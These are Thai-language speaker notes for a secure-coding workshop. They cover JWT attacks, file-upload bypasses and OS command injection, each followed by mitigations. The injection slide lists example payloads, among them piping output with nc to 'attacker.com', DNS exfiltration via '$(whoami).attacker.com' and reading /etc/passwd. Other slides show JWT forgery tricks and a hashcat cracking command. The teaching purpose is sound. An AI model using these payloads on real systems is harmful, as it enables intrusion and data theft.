- เวลา ~20 นาที/topic — ถ้า topic ไหนเสร็จเร็ว ให้เวลา Q&A discussion
- CI/CD content เดิม ย้ายไป **Appendix B (self-study)** แล้ว — ชี้ให้ผู้เรียนอ่านต่อเองที่บ้าน

---

## Slide 51 (~h.v 11.2): What is Dynamic Testing?

- "SAST = static, ไม่ต้อง run — อ่าน source code หา pattern"
- "DAST / Dynamic = ต้อง run app จริง ส่ง request เข้าไป ดู response"
- "ของบางอย่างเห็นเฉพาะตอน runtime: business logic, authentication flow, runtime config"
- ย้ำ: ใน ITSC MIS pipeline = Burp-DAST Baseline ที่เรา mention ไป Session 3
- "วันนี้เราจะเน้น 3 vulnerability ที่ common มาก แต่คนส่วนใหญ่ยังไม่รู้จักดี"

---

## Slide 52 (~h.v 11.3): 5.1 JSON Web Token (JWT) Intro

- "JWT เป็นมาตรฐาน token สำหรับ authentication — ใครเขียน API น่าจะเจอเกือบทุกคน"
- แยกโครงสร้าง 3 ส่วน: `header.payload.signature`
- "ส่วนใหญ่ dev จะ trust library blindly — นั่นคือจุดที่ attacker exploit"
- "เรามาดู 5 attack patterns ที่พบใน pentest"

---

## Slide 53 (~h.v 11.4): JWT — Common Attacks

- **`alg=none` attack**: "attacker แก้ header เป็น `{"alg":"none"}` → server ยอมรับ token ไม่มี signature → ปลอม identity ได้"
  - "Library เก่าบางตัวยอมรับ `alg=none` โดย default — ล่าสุดก็ยังเจอใน production"
- **Weak secret / brute-force HS256**: "HS256 ใช้ secret เดียว — ถ้า secret คือ 'secret' / 'password' → ใช้ `jwt_tool` หรือ hashcat brute ได้ในไม่กี่นาที"
  - Demo (ถ้ามีเวลา): `hashcat -m 16500 token.txt rockyou.txt`
- **No expiry / token replay**: "token ไม่มี `exp` claim → ใช้ได้ตลอดชาติ — ถ้า leak แล้วไม่สามารถ revoke"
- **Algorithm confusion (RS256 → HS256)**: "server ประกาศใช้ RS256 (asymmetric) แต่ library check ไม่แน่น — attacker ส่ง token เป็น HS256 โดยใช้ public key เป็น secret → server verify ผ่าน"
- **Missing `kid` validation**: "`kid` = key id ที่ดึง key file — attacker ใส่ `kid=../../etc/passwd` → path traversal"

---

## Slide 54 (~h.v 11.5): JWT — Mitigations

- **Enforce `alg` server-side**: "อย่าเชื่อ `alg` จาก header — hardcode ฝั่ง server ว่าใช้ algorithm ไหน"
- **Strong 256-bit secret**: "ไม่ใช้ string มนุษย์อ่านออก — generate ด้วย `openssl rand -base64 32`"
- **Short expiry + refresh tokens**: "access token 5-15 นาที, refresh token ใน httpOnly cookie"
- **`kid` validation**: "allowlist เฉพาะ kid ที่รู้จัก, ไม่ใช้ค่า kid เป็น file path"
- **Library hardening**: "ใช้ library ที่ update ล่าสุด อย่าใช้ `jwt.decode(verify=False)` เด็ดขาด"
- ถ้ามีเวลา: "revocation list / deny list = backup plan ถ้า token leak"

---

## Slide 55 (~h.v 11.6): 5.2 File Upload Intro

- "File upload = vulnerability ที่ developer ส่วนใหญ่ underestimate"
- "ถ้าให้ user upload file แล้ว app คุณสามารถ: RCE, XSS, SSRF, path traversal ได้เลยในตัวเดียว"
- "เราจะดู 4 attack patterns + mitigations"

---

## Slide 56 (~h.v 11.7): File Upload — Attack Patterns

- **Extension bypass**:
  - "Double extension: `shell.php.jpg` → server ที่ check แค่ extension สุดท้ายจะ fail — แต่บาง server รัน PHP เพราะมี `.php`"
  - "Null byte: `shell.php%00.jpg` — legacy PHP/Perl จะ truncate ที่ null byte → execute เป็น PHP"
  - "Case variations: `.PhP`, `.pHtml` — ถ้า check case-sensitive จะพลาด"
- **MIME type spoofing**:
  - "attacker ตั้ง `Content-Type: image/jpeg` — แต่ file จริงเป็น PHP"
  - "อย่า trust Content-Type header — มันคือ user input"
- **Path traversal in filename**:
  - "`filename=../../etc/passwd` — ถ้าเอาไป concat path → เขียนทับระบบ"
  - Windows: `..\\..\\windows\\system32\\config\\sam`
- **Polyglot files**:
  - "ไฟล์เดียวเป็น valid JPG + valid PHP + valid HTML พร้อมกัน"
  - "pass image validation แต่ execute เป็น PHP เมื่อ include"
- Live example (ถ้ามีเวลา): แสดง `file` command vs extension — "magic bytes บอกความจริง"

---

## Slide 57 (~h.v 11.8): File Upload — Mitigations

- **Extension allowlist, not blocklist**: "ระบุเฉพาะที่อนุญาต — `.jpg, .png, .pdf` เท่านั้น"
- **Magic-byte validation**: "อ่าน first bytes ของ file จริง (เช่น `\xFF\xD8\xFF` = JPEG) — อย่าเชื่อ Content-Type หรือ extension"
- **Store outside webroot**: "save ที่ `/var/uploads/` ไม่ใช่ `/var/www/html/uploads/` — เพื่อไม่ให้ server execute"
- **Randomize filenames**: "ใช้ UUID หรือ hash — ไม่เก็บ original filename (strip ด้วย path traversal)"
- **ClamAV หรือ antivirus scan**: "บังคับ scan ทุก upload ก่อน save"
- **Separate domain for uploads**: "user-content.example.com — isolate cookie scope + CSP"
- **Size limits + rate limits**: "กัน DoS"
- ย้ำ: "ทำทุกข้อ — defense in depth ไม่ใช่เลือกทำข้อเดียว"

---

## Slide 58 (~h.v 11.9): 5.3 OS Command Injection Intro

- "Injection ประเภทที่ร้ายแรงที่สุด — ได้ shell บน server"
- "พบบ่อยใน: feature 'ping host', 'nslookup', 'convert image', 'backup database' ที่เรียก external binary"
- "เราจะดู 3 attack patterns + mitigations — และตัวอย่างใน `app.py` ของ lab"

---

## Slide 59 (~h.v 11.10): OS Command Injection — Patterns

- **Shell metacharacters**: `;`, `|`, `&`, `$()`, backticks
  - "`ping 127.0.0.1; cat /etc/passwd` — `;` แยก command → cat ทำงานต่อ"
  - "`ping 127.0.0.1 | nc attacker.com 4444` — redirect output ออกเน็ต"
  - "`ping $(whoami).attacker.com` — DNS exfil ง่ายๆ"
- **Argument injection**:
  - "`curl -o /etc/passwd attacker.com/file`"
  - "ถึงไม่มี shell metachar ก็ inject flags เข้าไปได้"
  - เช่น `user-input = '--config=/etc/shadow'`
- **Blind / time-based detection**:
  - "ไม่มี output กลับ → ใช้ `sleep 10` → วัดเวลา response"
  - "หรือ DNS exfil: `$(whoami).attacker.com` → ดู DNS log ที่ attacker domain"
- ตัวอย่างจาก lab: `app.py` บรรทัด 87-92 — `os.popen(f"ping -c 1 {host}")` = classic shell injection

---

## Slide 60 (~h.v 11.11): OS Command Injection — Mitigations

- **ไม่ใช้ `shell=True`**: "Python: `subprocess.run(cmd, shell=True)` ← ห้าม ใช้ array form แทน"
- **`subprocess` ด้วย arg array**: "`subprocess.run(['ping', '-c', '1', host])` — ส่ง argument เป็น list → shell ไม่ parse metacharacters"
- **Allowlist inputs**: "ถ้า host ต้องเป็น IP → validate ด้วย regex `^\d+\.\d+\.\d+\.\d+$` ก่อน pass ไป subprocess"
- **`shlex.quote` ถ้าต้องสร้าง shell command**: "แต่ preferred คือไม่ใช้ shell เลย"
- **Principle of least privilege**: "app user ไม่ควรมีสิทธิ์ write `/etc/` หรือ spawn subprocess ที่ไม่จำเป็น — container no-new-privileges + drop capabilities"
- **Avoid calling shell tools เมื่อมี library Python ใช้**: "ใช้ `requests` แทน `curl`, `PIL` แทน `convert`, `smtplib` แทน `sendmail`"
- ถ้ามีเวลา: แสดง bad vs good code ใน `app.py` vs `solutions/app_fixed.py`

---

## Slide 61 (~h.v 12.1): Wrap-up + Q&A

- สรุปสั้นๆ: เราได้เรียนอะไรบ้างวันนี้
  - OWASP Top 10 (2025) + SDLC mapping
  - Manual code review + Hands-on 1 (หา 12 ช่องโหว่)
  - Tools: Semgrep, Syft, Gitleaks — hands-on Session 4
  - ITSC MIS real-world pipeline
  - Dynamic Testing: JWT / File Upload / OS Command Injection
- "ตอนนี้คุณมีทั้ง knowledge และ tools แล้ว ที่จะเริ่ม scan project ของคุณเอง + เข้าใจ attack patterns"
- ให้ดู Tools Summary table
- **เปิดรับคำถาม** — standalone Q&A slot ถูกรวมเข้า Wrap-up แล้ว
- ถ้าไม่มีคำถาม: แนะนำ resources
  - OWASP Top 10 อ่านเพิ่มได้ที่ owasp.org
  - Semgrep playground: semgrep.dev/playground
  - jwt.io debugger + JWT Tool (github.com/ticarpi/jwt_tool) สำหรับ Session 5 topics
- ชี้ Appendix A (Docker security) + Appendix B (CI/CD integration) ใน repo = self-study
- บอกว่า materials + slides อยู่ที่ GitHub repo

---

## Slide 62 (~h.v 12.2): Thank You

- ขอบคุณทุกคน
- "Happy Secure Coding!"
- "อย่าลืม — scan early, scan often + test dynamic ก่อน deploy"
- ให้ feedback ได้

---

## Tips สำหรับ Presenter

### จัดการเวลา (4 ชั่วโมง total)
- Session 1 (45 min): ถ้าเวลาน้อย ข้าม A06-A08 ให้ผู้เรียนอ่านเอง — อย่าข้าม SDLC intro เพราะเป็น foundation
- Session 3 (30 min): ITSC MIS use case = highlight — อย่าลดเวลา
- Session 4 (45 min): นี่สำคัญที่สุด อย่าข้าม ให้เวลาเต็ม — Docker Part D = self-study ถ้าเวลาไม่พอ
- Session 5 (60 min): 3 topic × 20 นาที — ถ้า topic ไหนเสร็จก่อน ใช้เวลาที่เหลือ demo/Q&A

### จัดการปัญหา
- "ถ้า tool install ไม่ผ่าน — ถามผมเลย อย่านั่งนาน"
- ถ้า Syft/Dependency-Track ไม่มี → ใช้ `grype sbom.json` แทน
- ถ้า Docker ไม่มี → อ่าน Dockerfile/compose เป็น code review แทน

### Engagement
- ถาม question ระหว่าง presentation: "ที่ทำงานใช้ tool อะไรกันบ้าง?"
- ให้ผู้เรียน share experience ของตัวเอง
- ยกมือถามสถานะการณ์: "ใครเคยเจอ breach ใน org ของคุณมั้ย?"

---

## Slide 63 (~h.v 13.1): Appendix Section

- "ส่วนนี้เป็น bonus content สำหรับ self-study"
- "ครอบคลุม 2 appendix:
  - **Appendix A**: Security Dockerfile & Docker Compose
  - **Appendix B**: CI/CD Integration & Best Practices (เดิมเป็น Session 5)"
- "ถ้าเวลาวันนี้ไม่พอ อ่านที่บ้านได้ — มีใน repo ทั้ง slides และ lab"
- ให้ดูตัวอย่าง secure Dockerfile และ docker-compose.yml ที่ `lab/solutions/`
- Appendix B อ้างอิง: `docs/tool-comparison.md` + GitHub Actions workflow ใน slides เดิม

---

## Slide 64 (~h.v 13.2): Docker Security Scanning Checklist

- "นี่คือ checklist ที่คุณเอาไปใช้กับ project ของคุณได้เลย"
- เน้น items สำคัญ: non-root (2), multi-stage (3), pin version (4), cap_drop (10)
- "ถ้าผ่าน 15 items นี้ Docker setup ของคุณจะปลอดภัยขึ้นมาก"
- ให้ดู `lab/solutions/Dockerfile` และ `lab/solutions/docker-compose.yml` เป็น reference

---

## Appendix B: CI/CD Integration & Best Practices — Self-study Speaker Notes (was Session 5)

> เนื้อหานี้เดิมอยู่ใน Session 5 — ย้ายมาเป็น self-study เพราะ overlap กับ ITSC MIS use case ที่ Session 3 ได้ cover แล้ว

### B.1: Security in CI/CD Pipeline

- Flow: pre-commit → PR → build → post-build → weekly
- "ทุก stage มี security check"
- PR check = gate สำคัญ: "ถ้า Semgrep เจอ critical → block merge"
- Weekly scan: "ตรวจสอบเต็มรูปแบบทุกสัปดาห์"

### B.2: GitHub Actions Example

- อ่าน YAML ทีละ job อธิบาย
- Semgrep action: "เพิ่มใน repo แล้วมัน scan ทุก PR อัตโนมัติ"
- Gitleaks action: "block secrets ก่อนเข้า code"
- "GitHub Actions config ใช้ได้เลย — copy ไปใส่ repo ได้"
- GitLab CI / Jenkins versions อยู่ใน `docs/tool-comparison.md`

### B.3: Best Practices & Security Culture

- **Scan Early** — "ยิ่งเร็วยิ่งถูก ยิ่งถูกที่สุด"
- **Automate** — "ถ้าต้องจำทุกครั้ง มันจะไม่เกิดขึ้น"
- **Fix Critical First** — "อย่าไปแก้ low ก่อนเพราะมันง่าย — critical มีผลกระทบสูงสุด"
- **Track Security Debt** — บันทึกและติดตาม issues
- **Regular Updates** — อัปเดต dependencies สม่ำเสมอ
- **Security in Every PR** — ทุก review มีมุมมอง security
- **Security Champions** = developer ในทีมที่เป็น security expert คนแรกที่ถาม
- สำหรับ reference architecture จริง กลับไปดู slide ITSC MIS Use Case ที่ Session 3
